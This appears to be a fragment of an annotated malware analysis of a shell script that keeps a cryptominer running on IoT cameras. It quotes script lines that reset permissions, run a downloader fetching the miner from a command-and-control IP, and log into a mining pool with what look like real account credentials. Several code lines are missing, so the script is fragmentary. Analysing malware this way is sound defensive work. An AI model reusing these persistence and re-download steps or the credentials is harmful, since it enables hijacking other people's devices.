# ^-- Standard shell shebang. Script runs in BusyBox ash.

macaddr=`ip a show eth0 | grep ether | cut -d " " -f6`
# [DEVICE FINGERPRINTING] Extracts the MAC address from eth0 interface.
# Used as a unique worker identifier in the mining pool:
#   hi_00:E0:F8:54:79:17
# This lets the attacker track this specific camera in their dashboard.

i=0
# [COUNTER INIT] Loop count for FTP fallback decision.
# After 50 successful mining cycles (~3.3 min), switches to FTP backup.

# [PERSISTENCE] Infinite loop. This script runs until the system dies.
do
    chmod 777 /bin/omm
    # [PERMISSION HARDENING] Ensures the miner is executable.
    # Set each cycle in case a defender removed execute permissions
    # instead of deleting the file.

    chmod 777 /tmp/dl
    # [PERMISSION HARDENING] Ensures the downloader is executable.
    # Ready for re-download if integrity check fails.

        -accept-tos \
        -email=hwansna@gmail.com \
        -password=Y_rLkZXgn3BQ02lRFV6E5 \

    #
    # Flag breakdown:
    #   -device-name=hi_<MAC>  Worker/rig identifier for pool dashboard
    #   -accept-tos            Accepts pool Terms of Service
    #   -email=hwansna@gmail.com  Pool account login / wallet identifier
    #   -password=Y_rLk...     Pool worker authentication token
    #   2>&1 > /dev/null       Discards ALL output (stealth operation)

    # NOTE: The miner process stays running in the background.
    # This script blocks here until omm exits (crashes or is killed).

    # wc -c counts bytes, awk extracts just the number.

        # This triggers if:
        #   - Binary was deleted (file doesn't exist, size = "")
        #   - Binary was corrupted or replaced
        #   - Download was truncated
        #   - A defender replaced omm with a dummy file

        cd /bin/ && /tmp/dl
        # [RE-DOWNLOAD] Change to /bin and run the HTTP downloader.
        # /tmp/dl sends: GET /omm HTTP/1.0 to 86.38.203.214
        # And writes the response to ./omm (which is /bin/omm)
        # Loop returns to 'do' and tries to launch omm again.

        # This means it ran and exited (or crashed) but the file is intact.

            # or as a preemptive measure against HTTP traffic blocking.
            # IoT cameras often have FTP enabled for uploading footage,

            #   -p XAUob5E...    FTP password
            #   86.38.203.214    C2 server IP

    #   - Miner is checked 15 times per minute
